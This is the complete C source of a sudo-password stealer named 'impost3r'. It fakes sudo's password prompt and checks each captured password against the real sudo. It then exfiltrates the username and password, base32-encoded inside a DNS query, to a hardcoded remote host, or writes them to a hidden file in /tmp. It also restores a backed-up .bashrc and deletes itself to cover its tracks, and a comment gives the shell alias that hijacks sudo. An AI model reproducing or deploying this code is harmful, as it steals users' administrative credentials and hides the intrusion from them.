#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <pwd.h>
#include <termios.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include "../dns/dns.h"
#include "../encode/encode.h"

/* 
    Don't edit 
*/
# define BUFFER_LEN 4096
# define MAX_RETRY 3

/*
    Custom setting
*/
# define FILENAME "/tmp/.impost3r"
# define BACKUP_BASHRC "/tmp/.bashrc"
# define SAVE_OR_SEND 0 //send=0,save=1,default is send
/*
    Send to server
*/
# define MAX_RESEND 30
# define RESEND_INTERVAL 5
# define REMOTE_ADDRESS "192.168.0.12"
# define REMOTE_PORT 53

/*
    Save to local
*/
# define SAVE_LOCATION "/tmp/.cache"

int successFlag = 1;
int retryTimes = 0;
int subshell_done = 0;
char current_user[2048];
struct termios recoverterminal;

/*
    Usage：
        alias sudo='impost3r() {
        if [ -f "/tmp/.impost3r" ]; then
        /tmp/.impost3r "$@" && unalias sudo
        else
        unalias sudo;sudo "$@"
        fi
        }; impost3r'
*/

void 
sudo(char arguments[])
{
    char command[10000] = {0};

    snprintf(command,10000,"/usr/bin/sudo%s",arguments);
    system(command);
}

ssize_t
steal_password(char **lineptr, size_t *n, FILE *stream)
{
    struct termios fakeTerminal, realTerminal;

    if (tcgetattr (fileno (stream), &realTerminal) != 0)
        return -1;

    fakeTerminal = realTerminal;
    fakeTerminal.c_lflag &= ~ECHO;

    recoverterminal = realTerminal;

    if (tcsetattr (fileno (stream), TCSAFLUSH, &fakeTerminal) != 0)
        return -1;

    getline (lineptr, n, stream);

    tcsetattr (fileno (stream), TCSAFLUSH, &realTerminal);

    return 1;
}

void
strrpc(char **str,char *oldstr,char *newstr){
    char bstr[4096];
    int i;
    memset(bstr,0,sizeof(bstr));
 
    for(i = 0;i < strlen(*str);i++){
        if(!strncmp(*str+i,oldstr,strlen(oldstr))){
            strcat(bstr,newstr);
            i += strlen(oldstr) - 1;
        }else{
        	strncat(bstr,*str + i,1);
	    }
    }
   *str = (char *) malloc(sizeof(bstr));
   strcpy(*str,bstr);
}

int 
count_equals(char *encoded_string){
    int i ;
    int count = 0;
    int interrupt = 0;

    for (i = 0;i < strlen(encoded_string);i++){
        if (encoded_string[i] == '='){
            if (count == 0){
                interrupt = i;
            }
            count ++;
        }
    }

    if (count != 0) {
        encoded_string[interrupt] = '\0';
    }

    return count;
}

char *
modify_result(char *encoded_string){
    static char modify_string[BUFFER_LEN];
    char temp[100];
    int i;

    memset(modify_string, 0, sizeof(modify_string));

    int number = strlen(encoded_string)/63;

    if (number == 0){
        return encoded_string;
    } else{
        for (i=0;i<number;i++){
            memset(temp, '\0', sizeof(temp));
            strncpy(temp,encoded_string+63*i*sizeof(char),63);
            temp[63] = '.';
            strcat(modify_string,temp);
        }
        memset(temp, '\0', sizeof(temp));
        strncpy(temp,encoded_string+63*i*sizeof(char),strlen(encoded_string)-63*i);
        strcat(modify_string,temp);
    }

    if (modify_string[strlen(modify_string)-1] == '.'){
         modify_string[strlen(modify_string)-1] = '\0';
    }

    return modify_string;
}

void 
save_passwd(char *name,char *password,char *all, int success)
{
    char *status = NULL; 
    status = "success";

    if (!success)
    {
        status = "fail"; 
    }

    char text[BUFFER_LEN] = {0};


    if (SAVE_OR_SEND){
        snprintf(text, sizeof(text), "%s:%s:%s\n", name, password, status); 
    } else{
        char tmp_text[4096];
        baseencode_error_t err;
        snprintf(tmp_text, sizeof(tmp_text), "%s:%s", name, password); 
        char *encoded_string = base32_encode((unsigned char*)tmp_text, strlen(tmp_text), &err);
        int count = count_equals(encoded_string);
        encoded_string = modify_result(encoded_string);
        snprintf(text, sizeof(text), "%d.%s.com", count,encoded_string); 
        free(encoded_string);
    }

    strcat(all,text);
}

void 
send_passwd(char *all)
{
    struct sockaddr_in evil;
    unsigned char *packet;
    int sockfd;
    unsigned int slen = sizeof(evil);

    if((sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1) {
        return;
    }

    evil.sin_family = AF_INET;
    evil.sin_port   = htons(REMOTE_PORT);
    evil.sin_addr.s_addr = inet_addr(REMOTE_ADDRESS);
    memset(&evil.sin_zero, 0, sizeof(evil.sin_zero));

    DNS_header *header = create_header(); 
    DNS_question *question = create_question(all);
    size_t packet_length = build_packet(header, question, &packet);

    free(header);
    free(question);

    int i;
    for (i =0;i<MAX_RESEND;i++)
    {
       sendto(sockfd, packet, packet_length, 0, (struct sockaddr *) &evil, slen);

       fd_set fds;
       FD_ZERO(&fds);
       FD_SET(sockfd,&fds);
       struct timeval timeout;
       timeout.tv_sec = RESEND_INTERVAL;
       timeout.tv_usec = 0;

       int ok = select(sockfd+1,&fds,NULL,NULL,&timeout);
       if (ok >0)
       {
           return;
       }
    }
}

void save_passwd_local(char *all)
{
   FILE *fp = NULL;
 
   fp = fopen(SAVE_LOCATION, "w");
   fputs(all, fp);
   fclose(fp);
}

void 
clear_all(){
   char command[BUFFER_LEN] = {0};

   snprintf(command, sizeof(command), "mv %s ~/.bashrc > /dev/null 2>&1;rm %s > /dev/null 2>&1", BACKUP_BASHRC, FILENAME);

   system(command);
}

void
user_interrupt(int signo){
    if (retryTimes == 0){
       printf("\n");
    } else if(retryTimes == 1){
       printf("sudo: %d incorrect password attempt\n", retryTimes); 
    } else{
       printf("sudo: %d incorrect password attempts\n", retryTimes); 
    }

    tcsetattr (fileno (stdin), TCSAFLUSH, &recoverterminal);
    exit(1);
}

void 
user_wakeup(int signo){
    if (subshell_done){
        struct termios fakeTerminal, realTerminal;
        printf("[sudo] password for %s: ", current_user);
        fflush(stdout);
        if (tcgetattr (fileno (stdin), &realTerminal) != 0)
            return;

        fakeTerminal = realTerminal;
        fakeTerminal.c_lflag &= ~ECHO;

        recoverterminal = realTerminal;

        if (tcsetattr (fileno (stdin), TCSAFLUSH, &fakeTerminal) != 0)
            return;
    }
}

char * 
fake_sudo(struct passwd *usrInfo,int argc,char arguments[],char *params[])
{
    char testCommand[BUFFER_LEN] = {0};
    char *stealPasswd = NULL;
    char *originPasswd = NULL;
    static char allPasswd[4096];
    size_t len = 0;

    strcpy(current_user,usrInfo->pw_name);
    signal(SIGINT,user_interrupt);
    signal(SIGCONT,user_wakeup);

    if (argc != 1)
    {
        while (retryTimes < MAX_RETRY)
        {
            printf("[sudo] password for %s: ", usrInfo->pw_name);
            steal_password(&stealPasswd,&len,stdin);

            int location =  strlen(stealPasswd)-1;
            if (stealPasswd[location] == '\n') stealPasswd[location] = '\0';

            originPasswd = (char *)malloc(len);
            strcpy(originPasswd,stealPasswd);

            strrpc(&stealPasswd,"\'","\'\"\'\"\'");

            snprintf(testCommand, sizeof(testCommand), "echo '%s' | /usr/bin/sudo -S whoami >/dev/null 2>&1",stealPasswd);
            printf("\n");

            subshell_done = 0;

            int testret = system(testCommand);

            subshell_done = 1;

            if (WIFSIGNALED(testret)) {
                if (WTERMSIG(testret) == SIGINT){
                    retryTimes ++;
                    user_interrupt(SIGINT);
                }
            }

            if (testret != 0)
            {
                if (retryTimes == MAX_RETRY-1)
                {
                    printf("sudo: %d incorrect password attempts\n", MAX_RETRY);
                    if (SAVE_OR_SEND){
                        save_passwd(usrInfo->pw_name,originPasswd,allPasswd,0);
                    }
                    return allPasswd;
                }

                printf("Sorry, try again.\n");
                if (SAVE_OR_SEND){
                    save_passwd(usrInfo->pw_name,originPasswd,allPasswd,0);
                }
            }
            else
            {
               int pid = fork();
               if (pid == 0)
               {
                   successFlag = 0;
                   save_passwd(usrInfo->pw_name,originPasswd,allPasswd,1);
                   return allPasswd;
               } 
               else
               {
                   wait(NULL); // 防止用户执行的是无限循环服务，从而产生僵尸进程
                   execv("/usr/bin/sudo",params);
                   exit(0);
               }
            }
           retryTimes ++;
           free(originPasswd);
        }
        //free(stealPasswd);
    }
    else
    {
        sudo(arguments);
    }
    return NULL;
}

int 
need_password()
{
    int status;

    status = system("/usr/bin/sudo -n true 2>/dev/null");

    if (status == 256) {
        return 1;
    } else {
        return 0;
    }
}

void 
hijack_sudo(struct passwd *usrInfo,int argc,char arguments[],char *params[])
{
    if (usrInfo)
    {
        if (need_password())
        {
            char *all = fake_sudo(usrInfo,argc,arguments,params);
            if (!successFlag)
            {
                /*
                    生成孤儿进程负责传输密码，子进程负责清场，防止阻塞
                */
                int pid = fork();
                if (pid == 0)
                {
                    if (SAVE_OR_SEND)
                    {
                        save_passwd_local(all);
                    }
                    else
                    {
                        send_passwd(all);
                    }
                }
                else
                {
                    clear_all();
                    exit(0);
                }
            }
        }
        else
        {
            sudo(arguments);
        }
    }
    else
    {
        sudo(arguments);
    }
}  

int 
main(int argc, char *argv[])
{
    struct passwd *usrInfo = getpwuid(getuid());

    char arguments[10000] = {0};
    
    char *params[1000];

    int anumber;
    int pnumber;

    for (anumber = 1;anumber < argc;++anumber)
    {
        snprintf(arguments+strlen(arguments), sizeof(arguments)-strlen(arguments), " %s", argv[anumber]);
    }
    
    params[0]="sudo";

    for (pnumber = 1;pnumber < argc;++pnumber)
    {
        params[pnumber] = argv[pnumber];
    }

    hijack_sudo(usrInfo,argc,arguments,params);

    return successFlag;
}